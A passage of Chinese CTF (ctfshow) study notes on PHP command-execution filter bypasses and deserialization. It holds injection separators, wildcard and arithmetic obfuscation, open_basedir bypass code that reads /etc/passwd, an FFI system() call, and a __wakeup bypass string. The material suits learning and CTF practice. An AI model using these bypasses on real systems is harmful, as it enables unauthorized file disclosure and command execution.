<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在类Unix系统中,/dev/<span class="literal">null</span>,或称空设备,是一个特殊的设备文件,它丢弃一切写入其中的数据(但报告写入操作成功)</span><br><span class="line"><span class="number">0</span>   标准输入</span><br><span class="line"><span class="number">1</span>   标准输出</span><br><span class="line"><span class="number">2</span>   错误输出</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>&gt;/dev/<span class="literal">null</span>   把错误输出到空设备（即丢弃）</span><br><span class="line">&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   相当于<span class="number">1</span>&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备</span><br><span class="line"><span class="number">2</span>&gt;&amp;<span class="number">1</span> &gt;/dev/<span class="literal">null</span>   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃</span><br><span class="line">something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路一：%<span class="number">0</span>a截断</span><br><span class="line">也就是使两条语句不在一行上执行</span><br><span class="line">c=ls%<span class="number">0</span>a</span><br><span class="line">思路二：管道符的运用</span><br><span class="line">| 直接执行后面的语句</span><br><span class="line">|| 如果前面执行的语句出错，则执行后面的语句</span><br><span class="line">&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</span><br><span class="line">&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句</span><br><span class="line">; 执行完前面的再执行后面的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="使用命令路径"><a class="markdownIt-Anchor" href="#使用命令路径"></a> 使用命令路径</h2>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bin为<span class="keyword">binary</span>的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。</span><br><span class="line">我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</span><br><span class="line">base64命令 Encode <span class="keyword">and</span> decode using Base64 representation</span><br><span class="line"></span><br><span class="line">c=/???/????<span class="number">64</span> ????.???      ---base64命令</span><br><span class="line">使用which +命令      ---输出全部的命令路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="source命令的使用"><a class="markdownIt-Anchor" href="#source命令的使用"></a> source命令的使用</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">source命令：</span><br><span class="line">source命令也称为“点命令”，也就是一个点符号（.）。</span><br><span class="line">source命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。</span><br><span class="line">用法： </span><br><span class="line">source filename 或 . filename</span><br></pre></td></tr></table></figure>
<h2 id="仅有和时"><a class="markdownIt-Anchor" href="#仅有和时"></a> 仅有$和()时:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(()) 代表做一次运算，因为里面为空，也表示值为<span class="number">0</span></span><br><span class="line">$((~$(()))) 对<span class="number">0</span>作取反运算，值为-<span class="number">1</span></span><br><span class="line">$(($((~$(())))$((~$(()))))) -<span class="number">1</span>-<span class="number">1</span>，也就是(-<span class="number">1</span>)+(-<span class="number">1</span>)为-<span class="number">2</span>，所以值为-<span class="number">2</span></span><br><span class="line">$((~$(($((~$(())))$((~$(()))))))) 再对-<span class="number">2</span>做一次取反得到<span class="number">1</span>，所以值为<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * <span class="number">37</span> + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h2 id="读取文件函数"><a class="markdownIt-Anchor" href="#读取文件函数"></a> 读取文件函数</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用读文件函数</span><br><span class="line">    --对读取文件时，必须指定目录,比如当前目录是./</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$filename</span>);    --字符串<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file — 把整个文件读入一个数组中</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fopen去读取文件内容</span></span><br><span class="line"><span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line"><span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="variable">$filename</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="查看当前目录文件"><a class="markdownIt-Anchor" href="#查看当前目录文件"></a> 查看当前目录文件</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;__FILE__&#x27;</span>)));</span><br></pre></td></tr></table></figure>
<h3 id="对scandir函数的替换"><a class="markdownIt-Anchor" href="#对scandir函数的替换"></a> 对scandir函数的替换</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">glob</span>(<span class="string">&#x27;*&#x27;</span>)     ---用通配符来便利全部文件</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>    --.可以用glob:<span class="comment">//*这个伪协议</span></span><br></pre></td></tr></table></figure>
<h3 id="与查看相关的函数-php"><a class="markdownIt-Anchor" href="#与查看相关的函数-php"></a> 与查看相关的函数  --php</h3>
<table>
<thead>
<tr>
<th>函数</th>
<th>示例</th>
<th>输出效果</th>
</tr>
</thead>
<tbody>
<tr>
<td>var_dump</td>
<td><code>var_dump($arr);</code></td>
<td>类型+结构+值</td>
</tr>
<tr>
<td>echo</td>
<td><code>echo $arr;</code></td>
<td>报错：数组不能 echo</td>
</tr>
<tr>
<td>json_encode</td>
<td><code>echo json_encode($arr);</code></td>
<td><code>&#123;&quot;a&quot;:1,&quot;b&quot;:2&#125;</code></td>
</tr>
<tr>
<td>serialize</td>
<td><code>echo serialize($arr);</code></td>
<td><code>a:2:&#123;s:1:&quot;a&quot;;i:1;...&#125;</code></td>
</tr>
<tr>
<td>var_export</td>
<td><code>var_export($arr);</code></td>
<td><code>array ('a' =&gt; 1,...)</code></td>
</tr>
<tr>
<td>get_defined_vars</td>
<td>get_defined_vars()</td>
<td>返回数组配合var_export函数使用</td>
</tr>
</tbody>
</table>
<h3 id="对目录的一些操作"><a class="markdownIt-Anchor" href="#对目录的一些操作"></a> 对目录的一些操作</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">.      --当前目录</span><br><span class="line">..     --上一级目录</span><br><span class="line">../..  --上上级目录</span><br><span class="line">/      --根目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="通过复制或者重命名"><a class="markdownIt-Anchor" href="#通过复制或者重命名"></a> 通过复制或者重命名</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// 将文件从 source 拷贝到 dest</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);  <span class="comment">// 尝试把 oldname 重命名为 newname</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="如果出现缓冲区代换"><a class="markdownIt-Anchor" href="#如果出现缓冲区代换"></a> 如果出现缓冲区代换</h2>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();	<span class="comment">// 返回输出缓冲区的内容</span></span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();	<span class="comment">// 清空（擦除）缓冲区并关闭输出缓冲</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">使用<span class="keyword">exit</span>();提前退出即可</span><br></pre></td></tr></table></figure>
<h2 id="open_basedir的限制"><a class="markdownIt-Anchor" href="#open_basedir的限制"></a> open_basedir的限制</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。</span><br><span class="line">当程序要使用例如<span class="title function_ invoke__">fopen</span>()或<span class="title function_ invoke__">file_get_contents</span>()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</span><br></pre></td></tr></table></figure>
<h3 id="1使用命令执行函数"><a class="markdownIt-Anchor" href="#1使用命令执行函数"></a> 1.使用命令执行函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">因为open_basedir的设置只是对目录的限制，对system等命令执行函数是无效的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2使用伪协议得不到文件内容"><a class="markdownIt-Anchor" href="#2使用伪协议得不到文件内容"></a> 2.使用伪协议(得不到文件内容)</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">foreach</span> (<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>) <span class="keyword">as</span> <span class="variable">$f</span>) <span class="keyword">echo</span> <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>().<span class="string">&quot;\n&quot;</span>;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span>   ---使用的是glob:<span class="comment">///伪协议，不直接触发 open_basedir 检查可绕过</span></span><br></pre></td></tr></table></figure>
<h3 id="3利用ini_set读取文件内容"><a class="markdownIt-Anchor" href="#3利用ini_set读取文件内容"></a> 3.利用ini_set读取文件内容:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir(&#x27;tmpdir&#x27;);                // 在当前目录下创建子目录 tmpdir</span><br><span class="line">chdir(&#x27;tmpdir&#x27;);                // 进入 tmpdir 目录</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);   // 把 open_basedir 限制设置为当前目录的上一级</span><br><span class="line">chdir(&#x27;..&#x27;);                    // 连续多次切换到上级目录</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);    // 再次尝试将 open_basedir 设置为根目录</span><br><span class="line">$a=file_get_contents(&#x27;/etc/passwd&#x27;); // 尝试读取系统用户文件</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<h3 id="4软连接"><a class="markdownIt-Anchor" href="#4软连接"></a> 4.软连接:</h3>
<p>关键是需要跳过多少层就需要多少级目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&quot;A&quot;);                         // 在当前工作目录创建目录 A</span><br><span class="line">chdir(&quot;A&quot;);                         // 进入目录 A</span><br><span class="line">mkdir(&quot;B&quot;);                         // 在 A 下创建目录 B</span><br><span class="line">chdir(&quot;B&quot;);                         // 进入 A/B</span><br><span class="line">mkdir(&quot;C&quot;);                         // 在 A/B 下创建目录 C</span><br><span class="line">chdir(&quot;C&quot;);                         // 进入 A/B/C</span><br><span class="line">mkdir(&quot;D&quot;);                         // 在 A/B/C 下创建目录 D</span><br><span class="line">chdir(&quot;D&quot;);                         // 进入 A/B/C/D</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A/B/C （上一级）</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A/B</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 当前脚本最初的工作目录（上上上上级）</span><br><span class="line">symlink(&quot;A/B/C/D&quot;,&quot;7abc&quot;);         // 在当前目录创建符号链接 7abc -&gt; A/B/C/D</span><br><span class="line">symlink(&quot;7abc/../../../../etc/passwd&quot;,&quot;exp&quot;); // 尝试创建符号链接 exp -&gt; ../../../../etc/passwd（通过相对路径串联指向系统文件）</span><br><span class="line">unlink(&quot;7abc&quot;);                     // 删除符号链接或文件名为 7abc（如果是目录则会失败）</span><br><span class="line">mkdir(&quot;7abc&quot;);                      // 创建一个普通目录名为 7abc（替代之前的符号链接）</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="php74以上ffi"><a class="markdownIt-Anchor" href="#php74以上ffi"></a> php7.4以上(FFI)</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的     </span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="常识"><a class="markdownIt-Anchor" href="#常识"></a> 常识:</h1>
<h2 id="1各类魔术方法"><a class="markdownIt-Anchor" href="#1各类魔术方法"></a> 1.各类魔术方法:</h2>
<table>
<thead>
<tr>
<th>魔术方法</th>
<th>触发时机</th>
<th>典型用途</th>
<th>攻击/利用常见点</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>__construct()</code></td>
<td>实例化对象时</td>
<td>初始化对象属性</td>
<td>一般不用于攻击，但可配合伪类实现替代类注入</td>
</tr>
<tr>
<td><code>__destruct()</code></td>
<td>对象销毁时（GC / 程序结束）</td>
<td>资源释放、日志等</td>
<td>✅常见反序列化POP链触发点，可执行恶意逻辑（如 system）</td>
</tr>
<tr>
<td><code>__call($method, $args)</code></td>
<td>调用不存在的对象方法</td>
<td>动态路由、代理调用</td>
<td>✅ 可结合参数污染触发函数劫持</td>
</tr>
<tr>
<td><code>__callStatic($method, $args)</code></td>
<td>调用不存在的静态方法</td>
<td>同上，静态版</td>
<td>✅ 框架中常被用作绕过点</td>
</tr>
<tr>
<td><code>__get($name)</code></td>
<td>读取不存在/不可见属性</td>
<td>延迟加载、动态代理</td>
<td>✅ 常配合属性污染用于变量值劫持</td>
</tr>
<tr>
<td><code>__set($name, $value)</code></td>
<td>写入不存在/不可见属性</td>
<td>数据保护、日志等</td>
<td>⚠️ 可用于伪造属性影响程序流</td>
</tr>
<tr>
<td><code>__isset($name)</code></td>
<td>使用 isset() 检测不存在属性时</td>
<td>判断状态</td>
<td>⚠️ 可辅助触发条件</td>
</tr>
<tr>
<td><code>__unset($name)</code></td>
<td>使用 unset() 删除不存在属性时</td>
<td>自定义清理</td>
<td>⚠️ 辅助</td>
</tr>
<tr>
<td><code>__sleep()</code></td>
<td><code>serialize()</code> 时触发</td>
<td>控制哪些属性被序列化</td>
<td>✅ 可精简 payload，绕过属性检测</td>
</tr>
<tr>
<td><code>__wakeup()</code></td>
<td><code>unserialize()</code> 时触发</td>
<td>恢复连接、状态</td>
<td>✅ 反序列化利用链典型入口点</td>
</tr>
<tr>
<td><code>__unserialize($data)</code></td>
<td>PHP 7.4+ <code>unserialize()</code> 时触发</td>
<td>替代 <code>__wakeup</code></td>
<td>✅ 新POP链构造点，精准控制反序列化行为</td>
</tr>
<tr>
<td><code>__toString()</code></td>
<td>对象被当作字符串用时</td>
<td>模拟字符串对象</td>
<td>✅ CTF绕过，如 <code>echo $obj</code> → 触发命令执行</td>
</tr>
<tr>
<td><code>__invoke()</code></td>
<td>对象被当作函数调用时</td>
<td>匿名函数、执行器</td>
<td>✅ 动态代码执行链中使用</td>
</tr>
<tr>
<td><code>__set_state($array)</code></td>
<td><code>var_export()</code> 导出再 <code>eval()</code> 恢复时触发</td>
<td>配置类导出导入</td>
<td>⚠️ 低频使用，静态类构建</td>
</tr>
<tr>
<td><code>__debugInfo()</code></td>
<td><code>var_dump()</code> 时触发</td>
<td>自定义调试输出</td>
<td>⚠️ 安全性低，但可用于信息泄露场景</td>
</tr>
<tr>
<td><code>__clone()</code></td>
<td>使用 <code>clone</code> 关键字时触发</td>
<td>深复制定制化</td>
<td>⚠️ 辅助构造链，不是主攻点</td>
</tr>
</tbody>
</table>
<h3 id="利用优先级"><a class="markdownIt-Anchor" href="#利用优先级"></a> 利用优先级:</h3>
<table>
<thead>
<tr>
<th>优先级</th>
<th>魔术方法</th>
<th>利用说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>🥇 必备</td>
<td><code>__destruct</code>, <code>__wakeup</code>, <code>__unserialize</code>, <code>__toString</code></td>
<td>关键触发点，常用于反序列化+代码执行</td>
</tr>
<tr>
<td>🥈 常用</td>
<td><code>__call</code>, <code>__get</code>, <code>__set</code>, <code>__invoke</code></td>
<td>控制流中用于中转跳板，劫持参数、动态执行</td>
</tr>
<tr>
<td>🥉 次要</td>
<td><code>__sleep</code>, <code>__callStatic</code>, <code>__set_state</code>, <code>__clone</code></td>
<td>配合使用，精细控制链构造、执行流程</td>
</tr>
<tr>
<td>⚠️ 罕见</td>
<td><code>__isset</code>, <code>__unset</code>, <code>__debugInfo</code></td>
<td>辅助性质，信息泄露或条件判断中用到</td>
</tr>
</tbody>
</table>
<h2 id="反序列化后走的魔术方法"><a class="markdownIt-Anchor" href="#反序列化后走的魔术方法"></a> 反序列化后走的魔术方法:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不走__construct()方法，可以用这个方法来赋值</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>阶段</th>
<th>魔术方法</th>
<th>在 CTF 里的作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>入口</td>
<td><code>__wakeup()</code></td>
<td>unserialize 时立即触发</td>
</tr>
<tr>
<td>利用链</td>
<td><code>__get()</code> / <code>__set()</code> / <code>__call()</code></td>
<td>链接到关键点</td>
</tr>
<tr>
<td>出口</td>
<td><code>__destruct()</code></td>
<td>最终必触发的点，常见执行危险操作</td>
</tr>
</tbody>
</table>
<h2 id="对wakeup的绕过"><a class="markdownIt-Anchor" href="#对wakeup的绕过"></a> 对wakeup的绕过:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.属性个数不匹配</span><br><span class="line">    漏洞影响范围</span><br><span class="line">    PHP5 &lt; 5.6.25</span><br><span class="line">    PHP7 &lt; 7.0.10</span><br><span class="line">	当反序列化字符串中表示属性个数的值大于实际属性个数时，PHP会忽略多余的属性，从而绕过__wakeup()方法的执行。</span><br><span class="line">	标准序列化结果</span><br><span class="line">    O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;Lxxx&quot;;s:8:&quot;password&quot;;s:4:&quot;lxxx&quot;;&#125;</span><br><span class="line">    将2改为3 绕过__Wakeup魔法函数</span><br><span class="line">    O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:4:&quot;Lxxx&quot;;s:8:&quot;password&quot;;s:4:&quot;lxxx&quot;;&#125;</span><br><span class="line">2.使用C标识符</span><br><span class="line">	将O替换为C，在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象，这样就不会调用__wakeup()方法。</span><br></pre></td></tr></table></figure>
<h1 id="基础用法"><a class="markdownIt-Anchor" href="#基础用法"></a> 基础用法:</h1>
<h2 id="1哪些是可以被反序列化出来的值"><a class="markdownIt-Anchor" href="#1哪些是可以被反序列化出来的值"></a> 1.哪些是可以被反序列化出来的值:</h2>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>可否反序列化</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>O:</code> 对象</td>
<td>✅ 是</td>
<td>能反序列化为类对象，前提是类存在或实现了 <code>__autoload()</code> / <code>spl_autoload_register()</code></td>
</tr>
<tr>
<td><code>a:</code> 数组</td>
<td>✅ 是</td>
<td>支持关联数组、索引数组</td>
</tr>
<tr>
<td><code>s:</code> 字符串</td>
<td>✅ 是</td>
<td>普通字符串可直接还原</td>
</tr>
<tr>
<td><code>i:</code> 整数</td>
<td>✅ 是</td>
<td>会转回 PHP 中的整数类型</td>
</tr>
<tr>
<td><code>d:</code> 浮点数</td>
<td>✅ 是</td>
<td>会被还原为 float 类型</td>
</tr>
<tr>
<td><code>b:</code> 布尔值</td>
<td>✅ 是</td>
<td><code>b:0;</code> 为 false，<code>b:1;</code> 为 true</td>
</tr>
<tr>
<td><code>N;</code> null</td>
<td>✅ 是</td>
<td>被还原为 <code>NULL</code></td>
</tr>
<tr>
<td><code>r:</code> &amp; <code>R:</code> 引用</td>
<td>✅ 是</td>
<td>用于同一变量多次引用，特殊情况使用，较少见</td>
</tr>
<tr>
<td><code>C:</code> 自定义序列化对象</td>
<td>✅ 是</td>
<td>需要类实现了 <code>Serializable</code> 接口</td>
</tr>
<tr>
<td><code>E:</code> 异常对象</td>
<td>⛔ 否</td>
<td><code>Exception</code> 等无法序列化传递再恢复成可用异常对象</td>
</tr>
<tr>
<td>资源类型</td>
<td>⛔ 否</td>
<td>如文件句柄等，<code>fopen()</code> 的结果不可序列化</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>漏洞点</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>类存在但未正确限制 <code>__wakeup()</code>、<code>__destruct()</code>、<code>__toString()</code>、<code>__call()</code> 等魔术方法</td>
<td>可能造成<strong>命令执行、文件操作、SQL注入等利用</strong></td>
</tr>
<tr>
<td>存在 <code>Serializable</code> 接口但处理不严谨</td>
<td>可控制反序列化过程中的内容，伪造内部逻辑</td>
</tr>
<tr>
<td>存在 <code>__autoload</code> 或自动加载机制</td>
<td>可通过构造类名配合 phar 包等技巧，实现远程加载</td>
</tr>
<tr>
<td>反序列化过程中触发数据库、文件、系统函数</td>
<td>可造成 <strong>POP链</strong>（Property-Oriented Programming）攻击</td>
</tr>
</tbody>
</table>
<h2 id="2x-forwarded-for请求头"><a class="markdownIt-Anchor" href="#2x-forwarded-for请求头"></a> 2.X-Forwarded-For请求头：</h2>
<p><strong>不属于某个编程语言特有的头部</strong>，它是一个 <strong>HTTP协议层的请求头（Header）</strong>，<strong>与语言无关</strong></p>
<table>
<thead>
<tr>
<th>语言/框架</th>
<th>使用方式</th>
<th>获取真实 IP 的方法</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>PHP</strong></td>
<td><code>$_SERVER['HTTP_X_FORWARDED_FOR']</code></td>
<td>或搭配 <code>$_SERVER['REMOTE_ADDR']</code> 使用</td>
</tr>
<tr>
<td><strong>Python（Flask/Django）</strong></td>
<td><code>request.headers.get('X-Forwarded-For')</code></td>
<td>默认 <code>request.remote_addr</code> 是代理地址</td>
</tr>
<tr>
<td><strong>Node.js (Express)</strong></td>
<td><code>req.headers['x-forwarded-for']</code></td>
<td>或 <code>req.ip</code>（需设置 <code>trust proxy</code>）</td>
</tr>
<tr>
<td><strong>Java (Spring Boot)</strong></td>
<td><code>request.getHeader(&quot;X-Forwarded-For&quot;)</code></td>
<td>配合 <code>RemoteAddrFilter</code> 使用</td>
</tr>
<tr>
<td><strong>Go (Gin/Echo)</strong></td>
<td><code>c.Request.Header.Get(&quot;X-Forwarded-For&quot;)</code></td>
<td>原始IP识别</td>
</tr>
<tr>
<td><strong>Nginx / Apache（Web服务器）</strong></td>
<td><code>real_ip_header X-Forwarded-For;</code></td>
<td>可用于替换 <code>REMOTE_ADDR</code></td>
</tr>
<tr>
<td><strong>Ruby on Rails</strong></td>
<td><code>request.headers[&quot;X-Forwarded-For&quot;]</code></td>
<td>也可用 <code>request.remote_ip</code></td>
</tr>
<tr>
<td><strong><a href="http://ASP.NET">ASP.NET</a></strong></td>
<td><code>Request.Headers[&quot;X-Forwarded-For&quot;]</code></td>
<td>常用于云服务中恢复用户IP</td>
</tr>
</tbody>
</table>
<h2 id="3php原生类"><a class="markdownIt-Anchor" href="#3php原生类"></a> 3.php原生类:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当调用一个不存在的方法会触发__call魔术方法，可以通过想哪一些原生类中存在__call魔术方法，再重写魔术方法就行了</span><br></pre></td></tr></table></figure>
<h3 id="1常见含__call魔术方法的原生类"><a class="markdownIt-Anchor" href="#1常见含__call魔术方法的原生类"></a> 1.常见含__call魔术方法的原生类:</h3>
<table>
<thead>
<tr>
<th>类名</th>
<th>来源</th>
<th>是否原生</th>
<th>利用意义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SoapClient</code></td>
<td>PHP 扩展 <code>soap</code></td>
<td>✅ 是</td>
<td>任意方法调用时触发 __call，可造成代码逻辑分流</td>
</tr>
<tr>
<td><code>Phar</code></td>
<td>PHP 扩展 <code>phar</code></td>
<td>✅ 是</td>
<td>存在 <code>__call</code>，配合文件操作可能形成 phar POP 链</td>
</tr>
<tr>
<td><code>SQLite3</code></td>
<td>扩展 <code>sqlite3</code></td>
<td>✅ 是</td>
<td>当调用不存在函数（函数未定义）时触发 __call</td>
</tr>
<tr>
<td><code>GMP</code></td>
<td>PHP 扩展 <code>gmp</code></td>
<td>✅ 是</td>
<td>虽有实现但较难用于利用</td>
</tr>
<tr>
<td><code>DateTimeImmutable</code></td>
<td>PHP 核心</td>
<td>✅ 是</td>
<td>存在魔术方法组合，但利用性较低</td>
</tr>
<tr>
<td><code>ReflectionFunctionAbstract</code></td>
<td>PHP 核心</td>
<td>✅ 是</td>
<td>某些版本中有魔术方法，但易失效</td>
</tr>
<tr>
